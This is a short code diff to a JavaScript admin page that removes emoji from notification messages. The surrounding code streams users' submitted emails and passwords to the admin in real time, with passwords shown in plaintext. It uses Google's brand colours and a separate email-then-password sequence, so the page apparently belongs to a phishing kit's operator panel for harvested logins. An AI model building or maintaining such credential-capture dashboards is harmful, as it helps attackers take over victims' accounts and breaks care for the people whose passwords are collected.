@@ -109,17 +109,17 @@ export default function AdminPage() {
                     let notificationColor = '#333';
                     
                     if (data.type === 'email_submit') {
-                        notificationMessage = `📧 Email submitted: ${data.email}`;
+                        notificationMessage = ` Email submitted: ${data.email}`;
                         notificationIcon = '📧';
                         notificationColor = '#1a73e8';
                     } else if (data.type === 'password_submit') {
                         // ✅ Show password if available
                         const passwordDisplay = data.password ? `, Password: ${data.password}` : '';
-                        notificationMessage = `🔑 Password submitted: ${data.email}${passwordDisplay}`;
+                        notificationMessage = ` Password submitted: ${data.email}${passwordDisplay}`;
                         notificationIcon = '🔑';
                         notificationColor = '#ea4335';
                     } else if (data.type === 'login_attempt') {
-                        notificationMessage = `🔐 Login attempt: ${data.email}`;
+                        notificationMessage = ` Login attempt: ${data.email}`;
                         notificationIcon = '🔐';
                         notificationColor = '#fbbc05';
                     }
